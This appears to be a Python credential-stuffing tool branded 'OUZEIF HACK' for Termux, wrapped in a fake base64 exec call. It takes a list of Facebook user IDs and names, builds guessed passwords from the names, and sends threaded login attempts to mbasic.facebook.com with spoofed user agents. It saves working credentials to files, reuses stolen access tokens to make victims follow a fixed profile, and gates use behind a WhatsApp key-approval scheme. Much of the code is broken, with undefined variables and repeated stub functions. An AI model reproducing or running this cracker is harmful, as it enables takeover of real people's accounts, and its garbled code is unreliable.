import base64
exec(base64.b64decode("# Decompile by : Hamid Meer'hamii 
import os,sys
try: import requests
except ModuleNotFoundError:print("hamii Install Module requests");os.system("python -m pip install requests &> /dev/hamii")
try: import bs4
except ModuleNotFoundError:print("hamii Install Module bs4");os.system("python -m pip install bs4 &> /dev/hamii")
try: import mechanize
except ModuleNotFoundError:print("hamii Install Module mechanize");os.system("python -m pip install mechanize &> /dev/hamii")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/hamii")
## import in
import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,requests
import os, time, uuid, requests
from multiprocessing.pool import ThreadPool
os.system("clear")
os.system("termux-setup-storage")
import requests as req
import requests as re
import time,random,json
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
class jalan:
	def __init__(self, z):
		for e in z + "\n":
			sys.stdout.write(e)
			sys.stdout.flush()
			time.sleep(0.009)
## import crack
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as kikygtg
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
try:os.remove("old.txt")
except:pass
try:os.remove("oldv2.txt")
except:pass
try:
	os.mkdir('dump')
except:pass
try:
	os.mkdir('result')
except:pass
try:
	os.mkdir('/sdcard/')
except:pass
try:
	import requests,calendar
except ModuleNotFoundError:
	os.system("python -m pip install requests ")
try:
	import bs4
except ModuleNotFoundError:
	os.system("python -m pip install bs4 ")
try:
	import mechanize
except ModuleNotFoundError:
	os.system("python -m pip install mechanize ")

import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
import requests, re, os, time
def line_chack_dote():
	m = [".","..","...","....","....."]
	for b in range(2):
		for t in m:
				sys.stdout.write("\r[*] Creating TNL Internet File " + t)
	sys.stdout.flush()
	time.sleep(0.1)
    
def main_apv():
    ak="~YASIN ~"
    os.system('clear')
    logo()
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
    except IOError:
        os.system("clear")
        logo()
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        print ("  Your Token Is Not Approved Already")
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        print ("           THIS IS YOUR KEY BRO")
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid)
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
        kok.close()
        print ("")
        print ("")
        print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        time.sleep(6)
        os.system("xdg-open https://wa.me/+923305867095")
        
    r1=requests.get("https://raw.githubusercontent.com/Hamii-king-06/OLD/main/Approval.txt").text
    if key1 in r1:
        R()
    else:
        os.system("clear")
        logo()
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        print ("  Your Token Is Not Approved Already")
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        print ("          THIS IS YOUR KEY BRO")
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        print ("")
        print ("          YOUR KEY : "+ak+key1)
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        print ("     Copy Key And Sent Me WP Approvel Your Key ")
        print ("[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━")
        time.sleep(3.5)
        os.system("xdg-open https://wa.me/+923305867095")
		
def R():
			os.system("clear")
			logo() 
			
			print(" \033[1;93m[1] C̤̮O̤̮M̤̮M̤̮E̤̮N̤̮C̤̮E̤̮R̤̮  ")
			print("                                                      ")
			print(" \033[1;93m[2] W̤̮H̤̮A̤̮T̤̮S̤̮A̤̮P̤̮P̤̮ ")
			print("                                                      ")
			print (" \033[1;93m[0] R̤̮E̤̮T̤̮O̤̮Ṳ̮R̤̮") 
			print("                                                      ")
			print (' \033[1;37m━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━')
			print("                                                      ")
			print("❤️ Il y a Dieu dedans ❤️")
			print("                                                      ")
			key = input(" [*] \033[1;94mCHOISIS 🎯 : ")
			print("                                                      ")
			print (' \033[1;37m━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━')
			if key in [""]:
				print (" [!] INCORRECT OPTION")
				exit()
			elif key in ["1", "01"]:
				time.sleep(0.5)
				__crack__().plerr()
			elif key in ["2", "02"]:
				time.sleep(0.5)
				os.system('xdg-open https://wa.me/+22962918792')
			
				login()
			elif key in ["0", "00" , "3"]:
				time.sleep(0.5)
				exit("\n [✓] Merci A Vous♥️\n")
	
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
_silet_koceng_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_realme = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'	# WARNA MATI 
def login():
	os.system("rm -rf access_token.txt");logo()
	tok = input(' [*] Enter Your Token : ')
	try:
			u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
			u1 = json.loads(u)
			name = u1['name']
			ts = open('access_token.txt', 'w')
			ts.write(tok)
			ts.close()
			print("\n\n[*] Connecté Avec Succès Sous " + name )
			time.sleep(1)
			R()
	except KeyError:
			print('\n\n[*] Jeton Expiré ')
			time.sleep(1)
			login()

def banner():
	logo()
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print('\n\n\033[0m Processus Terminé...')
		print('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
		#print('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
		print('\n\033[0mERROR')
		exit()
class __crack__:
	def __init__(self):
		self.id = []
	def plerr(self):
		try:
			self.apk = input(" \033[1;96m[*] 🄵🄸🄲🄷🄸🄴🅁 📂 : ")
			print("                                                      ")
			print (' \033[1;96m[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━')
			self.id = open(self.apk).read().splitlines()
			print(' \033[1;32m[*] ID COLLECTÉS : %s'%(len(self.id)))
			print (' \033[1;32m[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━')
			print(' \033[1;93m[*]\033[1;93m    M͓̽ E͓̽ T͓̽ H͓̽ O͓̽ D͓̽\033[1;37m')
			print (' \033[1;93m[*]━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━')
		except:
			print('\n [!] 🚫 Ficher Non Trouvé 🚫')
			input('\n [*] Touche entrée pour revenir en arrière');R()
     
		self.__pler__()
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ OUZEIF 😊] \033[1;97m%s/%s   \033[1;92m[ OK ✔️:%s ]  \033[1;91m[ CP ❎:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			except: pass
			try:
				ua_xiaomi = open('agent.txt', 'r').read()
				ua_nokia = open('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
				ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
			ses = requests.Session()
			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[OUZEIF-SUCCES] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/OUZEIF_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				open('/sdcard/ids/tokens.txt','a').write(access+'\n')
				follow_id='100001020800712'
				subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+access).text
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				try:
					token = hamii('token.txt').read()
					cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahn(user))
					cp.append(wrt)
					open('/sdcard/YASIN_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					year  = ''
				except:
					pass
				print('\r\033[1;91m[OUZEIF-ECHEC] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahu(user))
				cp.append(wrt)
				open('/sdcard/OUZEIF_CP.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
	def __pler__(self):
		print ("\033[1;94m [1] Aᴜᴛᴏ 2 Pᴀss ([ prσ ] Come Soon ")
		print (" [2] Aᴜᴛᴏ 2 Dɪɢɪᴛ Pᴀss [ fαѕt ] ")
		print (" [3] Aᴜᴛᴏ 5 Pᴀss [ ՏӀօա ]")
		print (" [4] Aᴜᴛᴏ 4 Dɪɢɪᴛ Pᴀss [ ѕlσw ]")
		yan = input('\n [•] \033[1;37m C H O O S E : ')
		if yan == '':
			print('\Choose Error ')
			exit()
		elif yan in ('1', '01'):
			time.sleep(1)
			print('\n[•] Result OK saved to OK.txt')
			print('[•] Result CP saved to CP.txt')
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=30) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [first, xz[0] + 'last', xz[0] + 'Frist', xz[0] + 'Last']
						elif len(xz) == 2:
							pwx = [first123, xz[0] + 'last123', xz[0] + 'Frist123', xz[0] + 'Last1234']
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1]]
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1]]
						else:
							pwx = [first, xz[0] + 'last', xz[0] + 'Frist', xz[0] + 'Last']
							pwx = [Last, xz[0] + 'Last1', xz[0] + 'first', xz[0] + 'last1']
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('2', '02',):
			time.sleep(1)
			print('\n[•] LOADING ');logo()
			with ThreadPoolExecutor(max_workers=40) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('3', '03'):
			time.sleep(1)
			print('\n[•] LOADING ');logo()
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
							pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('4', '04'):
			time.sleep(1)
			print('\n[•] LOADING ');logo()
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, ]
						elif len(xz) == 2:
							pwx = [name, ]
						elif len(xz) == 3:
							pwx = [name, ]
						elif len(xz) == 4:
							pwx = [name, ]
						else:
							pwx = [name, xz[0]+"123", xz[0]+"12345"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
							pass
			os.remove(self.apk)
			hasil(ok,cp)
		else:
			print('\nSalah')
			time.sleep(1)
			self.__pler__()

if __name__=='__main__':
	
	help()
	
imtiazak_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
imtiazak_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
imtiazak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
banner="""\033[1;91m   
                                                                       
 @@@@@@   @@@  @@@  @@@@@@@@             @@@  @@@   @@@@@@@  @@@  @@@  
@@@@@@@@  @@@  @@@  @@@@@@@@             @@@  @@@  @@@@@@@@  @@@  @@@  
@@!  @@@  @@!  @@@       @@!             @@!  @@@  !@@       @@!  !@@  
!@!  @!@  !@!  @!@      !@!              !@!  @!@  !@!       !@!  @!!  
@!@  !@!  @!@  !@!     @!!    @!@!@!@!@  @!@!@!@!  !@!       @!@@!@!   
!@!  !!!  !@!  !!!    !!!     !!!@!@!!!  !!!@!!!!  !!!       !!@!!!    
!!:  !!!  !!:  !!!   !!:                 !!:  !!!  :!!       !!: :!!   
:!:  !:!  :!:  !:!  :!:                  :!:  !:!  :!:       :!:  !:!  
::::: ::  ::::: ::   :: ::::             ::   :::   ::: :::   ::  :::  
 : :  :    : :  :   : :: : :              :   : :   :: :: :   :   :::  
                                                                       
                                                     
\033[1;37m ━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━

\033[1;94m ⇨⚙ OWNER ⚙    : 💢 OUZEIF HACK 💢
\033[1;95m ⇨📞 WHATSAPP   : 💥 +22962918792 💥
\033[1;96m ⇨FACEBOOK  : ʬʆʬ Ouzéïf Guzman ʬʆʬ ✨  
\033[1;93m ⇨CHERCHE     : ☠️ PAS A COMPRENDRE ☠️
\033[1;91m ⇨👽VERSION👽   : 1.3.3 🎯
\033[1;95m                 Toi même faut voir 😏

\033[1;37m ━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━"""
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()
urls="https://business.facebook.com/business_locations"
_ses=requests.Session()
def logo():
	time.sleep(0.5)
	os.system("clear")
	print(banner)
	print("")
	time.sleep(0.5)

def convert(cok):
	__for=(
			'datr='+cok['datr']
		)+';'+(
			'c_user='+cok['c_user']
		)+';'+(
			'fr='+cok['fr']
		)+';'+(
			'xs='+cok['xs'] )
	return __for
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def dupcutter():
	os.system("xdg-open https://wa.me/+22962918792")
	time.sleep(3)
	R()

    
if __name__=='__main__':
     
	R()
"))